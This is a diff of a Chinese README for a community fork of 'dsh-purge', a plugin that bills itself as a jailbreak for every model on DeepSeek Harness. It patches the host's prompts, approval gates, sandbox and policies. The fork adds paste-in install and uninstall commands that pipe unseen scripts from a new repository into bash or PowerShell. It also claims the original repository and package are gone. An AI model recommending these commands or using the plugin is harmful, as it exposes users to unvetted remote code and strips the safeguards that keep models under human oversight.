@@ -1,21 +1,51 @@
+> **分支说明**：本仓库是 dsh-purge 1.1.71 的社区分支（维护者：巴里啊啊），只做 **0.2.1-rc.2 兼容修复**：去掉 `{{cwd}}` 提示词变量依赖（修「unknown prompt variable」）、去掉重复的 bundle 层插入（修「already queued」）、补上 profile 登记助手。与原作者无关联、无背书。原版仓库已下架。
+
+---
+
+## 一键安装
+
+> 本分支只适配 **`@deepseek-ai/dsh@0.2.1-rc.2`** 的 **web profile**（`dsh web`）。
+> 脚本会自动把宿主对齐到该版本——已装其它版本会被**覆盖重装**（约 830 MB）。官方桌面版不支持。
+> 前置：Node.js ≥ 18（Windows 无闪窗需 ≥ 22）、npm。`dsh` 没装脚本会替你装。
+
+**Mac / Linux** — 打开终端，粘贴一条命令，回车：
+
+```sh
+curl -fsSL https://raw.githubusercontent.com/evan545295555-hash/Evans-repo/main/install.sh | bash
+```
+
+**Windows** — 打开 PowerShell，粘贴一条命令，回车：
+
+```powershell
+irm https://raw.githubusercontent.com/evan545295555-hash/Evans-repo/main/install.ps1 | iex
+```
+
+看到 `✅ 安装完成` 就装好了。然后：`dsh web` → 点会话标题旁的 **dsh-purge** → **清洗** → **应用** → 新开一个对话。
+
+**卸载**：Mac/Linux `curl -fsSL https://raw.githubusercontent.com/evan545295555-hash/Evans-repo/main/uninstall.sh | bash`，Windows `irm https://raw.githubusercontent.com/evan545295555-hash/Evans-repo/main/uninstall.ps1 | iex`。
+
+> ⚠️ **不要只跑** `dsh plugin --profile web remove dsh-purge`。它只是把参数转发给 pnpm，只删包和依赖：不还原宿主补丁，也不清 `dsh.profile.bundles` 和 `cordis.patch.yml` 里的登记。残留会让宿主启动时去挂载一个已经不存在的 bundle，表现就是「起不来」。
+
+---
+
 <p align="center">
   <img src="docs/banner.svg" alt="dsh-purge" width="720">
 </p>
 
 <h1 align="center">⚔️ DeepSeek Harness 网络安全红队工具（dsh-purge）</h1>
 
-<p align="center"><strong>Version 1.1.71</strong></p>
+<p align="center"><strong>Version 1.1.71-rc2.1</strong></p>
 
 <p align="center">
   <em>DeepSeek Harness 破甲：让所有模型都能破甲，不同模型可换不同提示词；默认提示词面向国模「小码酱」。Jailbreak for every model — swap prompts per model. 求 Star 收藏 ⭐ 如要二开，请查看署名要求部分</em>
 </p>
 
 <p align="center">
-  <a href="https://github.com/YuJunZhiXue/dsh-purge/stargazers"><img src="https://img.shields.io/github/stars/YuJunZhiXue/dsh-purge?logo=github&label=Stars" alt="GitHub stars"></a>
-  <a href="https://github.com/YuJunZhiXue/dsh-purge/blob/master/LICENSE"><img src="https://img.shields.io/badge/license-MIT-65a30d?style=flat" alt="MIT license"></a>
+  <a href="https://github.com/evan545295555-hash/Evans-repo/stargazers"><img src="https://img.shields.io/github/stars/evan545295555-hash/Evans-repo?logo=github&label=Stars" alt="GitHub stars"></a>
+  <a href="https://github.com/evan545295555-hash/Evans-repo/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-65a30d?style=flat" alt="MIT license"></a>
   <a href="https://awesome-dsh-plugin.com"><img src="https://awesome-dsh-plugin.com/badge.svg" alt="awesome · DSH plugin"></a>
   <a href="https://deepseek.stream/plugins/dsh-purge"><img src="https://img.shields.io/badge/Hub-dsh--purge-1a73e8" alt="DeepSeek Harness Hub"></a>
-  <a href="https://www.deepseek.com/harness/"><img src="https://img.shields.io/badge/dsh-0.2.0--rc.2-blue" alt="DSH"></a>
+  <a href="https://www.deepseek.com/harness/"><img src="https://img.shields.io/badge/dsh-0.2.1--rc.2-blue" alt="DSH"></a>
   <br>
   <img src="https://img.shields.io/badge/Node.js-%3E%3D18-339933?logo=node.js&logoColor=fff" alt="Node.js">
   <img src="https://img.shields.io/badge/JavaScript-F7DF1E?logo=javascript&logoColor=000" alt="JavaScript">
@@ -29,14 +59,15 @@
   <a href="README.md">English</a> | <a href="README.zh-CN.md">中文</a>
 </p>
 
-> **官方 Web 和官方桌面端都支持。** 官方 `dsh web` 用 profile `web`；官方桌面 EXE（DeepSeek Harness **0.2.0-rc.2**）用 profile `desktop`。两边分开安装、分开点「应用」。当前版本只适配 dsh 0.2；更早的 dsh 用对应的老版本插件。社区桌面端不维护。
+> **本分支只支持官方 Web 宿主（`dsh web`，profile `web`），且宿主必须是 `@deepseek-ai/dsh@0.2.1-rc.2`。** 官方桌面 EXE 用的是 `desktop` profile，npm 版 `dsh` CLI 明确拒绝对它做插件管理。社区桌面端不维护。详见[适配范围](#适配范围)。
 >
 > 写进 profile 还不会改宿主。点会话标题旁的 **dsh-purge** → **清洗** → **应用**。成功会自动重启；补丁没打完不重启。重启后新开一轮对话，注入才进当前会话。
 >
-> Node.js **≥18**。Windows 无闪窗需要 **Node ≥22**。插件市场一键安装和下面的命令都走 npm 包 `dsh-purge`。
+> Node.js **≥18**。Windows 无闪窗需要 **Node ≥22**。一键脚本和下面的命令装的都是**本仓库 Releases 里的 tarball**，不是 npm 上的 `dsh-purge` 包名（那个名字现在只剩 `0.0.0-stage` 占位包）。
 
 ## 目录
 
+- [一键安装](#一键安装)
 - [赞助](#sponsor)
 - [介绍](#介绍)
 - [署名要求](#署名要求)
@@ -70,7 +101,7 @@
 
 ## 介绍
 
-**dsh-purge** 是装在本机官方 [DeepSeek Harness](https://www.deepseek.com/harness/) 上的网络安全红队评测插件。官方 **Web**（`dsh web`）和官方 **桌面端**（EXE）都支持，两边分开装、分开应用。
+**dsh-purge** 是装在本机官方 [DeepSeek Harness](https://www.deepseek.com/harness/) 上的网络安全红队评测插件。**本分支只支持官方 Web 宿主（`dsh web`）**：上游插件原本也支持桌面 EXE，但 npm 版 `dsh` CLI 拒绝对 `desktop` profile 做插件管理，所以本分支不覆盖桌面端。
 
 Harness 不只是把问题交给模型。它还会在运行时改提示词、审批门、沙箱和会话格式。只看「模型答不答」，会把宿主拦截误当成模型拒绝。这个插件在你自己的安装里把这两层分开，用来做受控评测，也用来看默认策略该不该收紧。
 
@@ -94,7 +125,7 @@ Harness 不只是把问题交给模型。它还会在运行时改提示词、审
 
 ## 署名要求
 
-**借用本项目的名称、思路、代码或提示词，必须署名，并写明来源仓库：** [YuJunZhiXue/dsh-purge](https://github.com/YuJunZhiXue/dsh-purge)。
+**借用本项目的名称、思路、代码或提示词，必须署名，并写明来源仓库：** 小杨的 `YuJunZhiXue/dsh-purge`（原仓库已删除，按上游许可证要求保留署名文字，不再挂死链）。本分支的改动见 [Evans-repo](https://github.com/evan545295555-hash/Evans-repo)。
 
 不署名、隐瞒来源、改头换面据为己有，作者将依法追究责任。
 
@@ -140,10 +171,11 @@ Harness 不只是把问题交给模型。它还会在运行时改提示词、审
 
 ## 适配范围
 
-最新版只支持 **dsh 0.2**，不要拿它去打 0.1.x。
+**本分支精确适配 `@deepseek-ai/dsh@0.2.1-rc.2` 的 web profile（`dsh web`）**，不要拿它去打 0.1.x、`0.2.0-rc.2` 或更新的 `0.2.2-rc.1`。
 
-- **dsh 0.2**（官方桌面 **0.2.0-rc.2** / 官方 `dsh web`）：用 **1.1.40** 及以上。本页命令装的就是这一档。
-- **dsh 0.1.7**（含 rc.1 / rc.2）：用 **1.1.39** 及更早 —— 在 [Releases](https://github.com/YuJunZhiXue/dsh-purge/releases) 里选对应标签。
+- 一键脚本会把宿主钉到 `0.2.1-rc.2`；已装其它版本时 `npm i -g` 会**覆盖重装**（约 830 MB）。
+- 官方桌面 EXE 用 `desktop` profile，npm 版 `dsh` CLI 拒绝对它做插件管理，所以本分支**不支持桌面端**。
+- 老宿主 dsh 0.1.7（含 rc.1 / rc.2）需要 **1.1.39** 及更早的插件。上游仓库已删除，npm 上的 `dsh-purge` 也只剩 `0.0.0-stage` 占位包，所以请直接用本仓库 [Releases](https://github.com/evan545295555-hash/Evans-repo/releases) 里的 tarball，别再用裸包名。
 
 对不上的补丁会显示待应用或跳过，不会乱改文件。
 
@@ -151,22 +183,19 @@ Harness 不只是把问题交给模型。它还会在运行时改提示词、审
 
 ## 安装
 
-现在只维护官方 `dsh web` 和官方桌面 EXE，**分开装、分开应用**，只装你正在打开的那一个。
+**优先用页面顶部的[一键安装](#一键安装)**：钉宿主版本 → 装 tarball → 登记 profile → 校验挂载，一步做完。下面是手动回退方式。
 
-| 你正在用 | profile | 命令 |
-|---|---|---|
-| 官方 `dsh web` | `web` | `dsh plugin --profile web add dsh-purge` |
-| 官方桌面 EXE | `desktop` | `dsh plugin --profile desktop add dsh-purge` |
+> ⚠️ npm 上的 `dsh-purge` 包名现在只解析到 `0.0.0-stage` 占位包，**不要执行** `dsh plugin --profile web add dsh-purge`，那样装不到本分支。请装本仓库 Releases 里的 tarball：
 
-当前目录已经是本仓库时，把包名换成 `add .`。`dsh` 不在 PATH 时走 [手动安装](#manual)。registry 上不去：同一个 `--profile`，把目标换成 `https://github.com/YuJunZhiXue/dsh-purge/archive/refs/heads/master.tar.gz`。
+```sh
+dsh plugin --profile web add --ignore-scripts https://github.com/evan545295555-hash/Evans-repo/releases/download/v1.1.71-rc2.1/dsh-purge-1.1.71-rc2.1.tgz
+cd "$DSH_HOME/profiles/web"   # 换成你实际在用的那份 web profile
+node node_modules/dsh-purge/scripts/ensure-profile-bundle.mjs
+```
 
-[插件市场](https://dsh-plugin.org/plugins/yujunzhixue/dsh-purge) 一键安装会按本仓库反查 npm，命中后装 `dsh-purge`。目录页可能仍写 `github:` —— 按钮若退回 git，用上表命令。
+当前目录已经是本仓库时把 URL 换成 `add .`。`dsh` 不在 PATH 时走 [手动安装](#manual)。装的是 tarball，不经 npm registry，所以「registry 被墙」不再需要 master.tar.gz 回退地址。
 
-桌面客户端也可以点按钮（`dsh://` 唤起）：
-
-<p align="center">
-  <a href="dsh://plugin/install?id=dsh-purge&name=dsh-purge&version=1.1.71&repo=YuJunZhiXue%2Fdsh-purge&permissions=%E7%B3%BB%E7%BB%9F%E6%8F%90%E7%A4%BA%E8%AF%8D%E6%B3%A8%E5%85%A5%2C%E6%9C%AC%E6%9C%BA%E8%A1%A5%E4%B8%81%2C%E8%AE%BE%E7%BD%AE%E9%A1%B5&downloadUrl=https%3A%2F%2Fgithub.com%2FYuJunZhiXue%2Fdsh-purge%2Farchive%2Frefs%2Fheads%2Fmaster.tar.gz"><strong>唤起客户端一键安装</strong></a>
-</p>
+> 官方桌面 EXE 用 `desktop` profile，npm 版 `dsh` CLI 拒绝对它做插件管理。本分支只支持 `web`，因此那个指向已删除上游仓库的 `dsh://` 一键唤起按钮已移除。
 
 ### 装完都要做这三步
 
@@ -176,7 +205,7 @@ Harness 不只是把问题交给模型。它还会在运行时改提示词、审
 2. 在**这个宿主**点会话标题旁的 **dsh-purge**，在 **清洗** 页点 **「应用」**。宿主的设置页里没有这个条目。
 3. 「应用」成功后会自动重启一次，让补丁进入当前进程。没做完不会重启。
 
-Web 的控件只动 Web，桌面端的只动桌面应用。不要在一个宿主里点另一个宿主的应用。
+本分支只装进 `web` profile，在 Web 宿主里点「应用」即可；本分支没有桌面端控件。
 
 ### 怎样算装上了
 
@@ -200,10 +229,10 @@ Web 的控件只动 Web，桌面端的只动桌面应用。不要在一个宿主
 `dsh` 不在 PATH 就告诉用户后停止。
 
 ```sh
-dsh plugin --profile web add dsh-purge
+dsh plugin --profile web add --ignore-scripts https://github.com/evan545295555-hash/Evans-repo/releases/download/v1.1.71-rc2.1/dsh-purge-1.1.71-rc2.1.tgz
 ```
 
-当前目录已是本仓库时改用 `dsh plugin --profile web add .`。npm registry 上不去再用 `dsh plugin --profile web add https://github.com/YuJunZhiXue/dsh-purge/archive/refs/heads/master.tar.gz`。
+当前目录已是本仓库时改用 `dsh plugin --profile web add .`。**不要**退回裸包名 `dsh-purge`，那是 npm 上的占位包。装的是 tarball，不经 npm registry。
 
 命令结束后，提醒用户：完全退出并重启 `dsh web`，再点会话标题旁的 **dsh-purge**，在「清洗」里点「应用」。然后停止。
 
@@ -240,10 +269,14 @@ $cands | Select-Object -Unique | Where-Object { $_ -and (Test-Path (Join-Path $_
 **2. 把插件放到 `$DSH_HOME/plugins/dsh-purge`**（目录名必须是 `dsh-purge`，其 `package.json` 里 `"name"` 也必须是 `dsh-purge`）。
 
 ```sh
-git clone https://github.com/YuJunZhiXue/dsh-purge.git "$DSH_HOME/plugins/dsh-purge"
+mkdir -p "$DSH_HOME/plugins/dsh-purge"
+curl -fsSL https://github.com/evan545295555-hash/Evans-repo/releases/download/v1.1.71-rc2.1/dsh-purge-1.1.71-rc2.1.tgz \
+  | tar -xz -C "$DSH_HOME/plugins/dsh-purge" --strip-components=1
 ```
 
-没有 git：下载 [master.tar.gz](https://github.com/YuJunZhiXue/dsh-purge/archive/refs/heads/master.tar.gz)，解压后把 `dsh-purge-master` 改名为 `dsh-purge`，整夹放到 `plugins` 下。已有本仓库副本就复制整个目录，不要只拷几个 `.js`。
+tarball 解出来根目录是 `package/`，所以用 `--strip-components=1` 剥掉一层（GNU tar 和 macOS 自带 bsdtar 都支持）。没有 curl 就从 [Releases](https://github.com/evan545295555-hash/Evans-repo/releases) 下载后同样解到 `plugins/dsh-purge`。已有本仓库副本就复制整个目录，不要只拷几个 `.js`。
+
+> 旧文档里的 `git clone https://github.com/YuJunZhiXue/dsh-purge.git` 和 `master.tar.gz` 指向已删除的上游仓库，现在都打不开了。
 
 **3. 只改对应 profile 的 `package.json`，先备份。** Web → `$DSH_HOME/profiles/web/package.json`；桌面 → `$DSH_HOME/profiles/desktop/package.json`。**只追加两处**，原有依赖和 bundle 全部留着：
 
@@ -287,13 +320,24 @@ pnpm install
 
 ### 卸载
 
-会话标题旁的 **dsh-purge** →「清洗」→「卸载」。弹窗确认：会先还原已应用的补丁，还原回原版 Harness，再重启当前宿主。
+**推荐用一键卸载脚本**：先备份 `package.json` / `cordis.patch.yml`，再还原宿主补丁、移除插件包、清掉 profile 登记，最后做残留复检。
 
 ```sh
-# 也可以用命令行 / 聊天
+curl -fsSL https://raw.githubusercontent.com/evan545295555-hash/Evans-repo/main/uninstall.sh | bash
+```
+
+Windows PowerShell：`irm https://raw.githubusercontent.com/evan545295555-hash/Evans-repo/main/uninstall.ps1 | iex`
+
+> ⚠️ **别只跑** `dsh plugin --profile web remove dsh-purge`。它只是把 `remove` 转发给 pnpm：只删包和依赖，**不还原**宿主补丁，**不清** `dsh.profile.bundles`，**不清** `cordis.patch.yml` 里的 `- insert: - id: dsh-purge`。残留会让宿主启动时去挂载一个已经不存在的 bundle，看起来就是「宿主起不来」。
+
+其它方式：会话标题旁的 **dsh-purge** →「清洗」→「卸载」（先还原补丁、还原回原版 Harness、再重启宿主），或命令行：
+
+```sh
 dsh-purge --uninstall
 # /purge uninstall
 ```
+
+如果之前已经只跑过 `remove`，再跑一次上面的一键卸载脚本把登记清干净。
 
 插件配置在 `cordis.patch.yml`（`postPrompt` 默认为空）：
 
@@ -550,14 +594,15 @@ flowchart LR
 
 ## 更新
 
-每一版改了什么、安装包在 [Releases](https://github.com/YuJunZhiXue/dsh-purge/releases)。发新版时把 `package.json` 的版本号改掉，中英文说明写进 `release-notes.md`，推到 `master` 就会自动打包。同一版本再推送不会重复发包。
+每一版改了什么、安装包都在本仓库 [Releases](https://github.com/evan545295555-hash/Evans-repo/releases)。当前版本 `v1.1.71-rc2.1` → `dsh-purge-1.1.71-rc2.1.tgz`（SHA256 `5364afd49f9bf75cba2d58b14340a59e7f74646e75e99645d7a137ade812d8f0`）。发新版时把 `package.json` 的版本号改掉，中英文说明写进 `release-notes.md`，推到 `main` 就会自动打包。同一版本再推送不会重复发包。
 
 ## 说明
 
 - 改动范围是本机 `@deepseek-ai/*` 包里的渲染文案、默认策略和执行逻辑，以及用户目录下的覆盖文件与规则集。
 - 升级后原文对不上会显示跳过，这次应用仍算完成，不会乱改。
 - 不改动非 `@deepseek-ai` 的第三方插件源仓库（启动时的 CMD 无感会**尽力**修补已装的 doctor / market / 梁神 / mnemon，属运行时补丁）。
-- 安装走 npm 包名 `dsh-purge`：`dsh plugin --profile web add dsh-purge` 或 `dsh plugin --profile desktop add dsh-purge`。当前目录已是本仓库时 `add .`。registry 上不去再加 master.tar.gz。插件市场一键安装走同一个 npm 包。
+- 装的是**本仓库 Releases 的 tarball**，不是 npm 裸包名：`dsh plugin --profile web add --ignore-scripts <release .tgz URL>`。当前目录已是本仓库时 `add .`。`dsh-purge` 在 npm 上现在只剩 `0.0.0-stage` 占位包；旧的 `master.tar.gz` / `git clone` 地址指向已删除的上游仓库。
+- 宿主自己装的话，命令是 `npm i -g @deepseek-ai/dsh@0.2.1-rc.2`（`@` 前没有空格、scope 后没有双斜杠）。
 
 ---
 
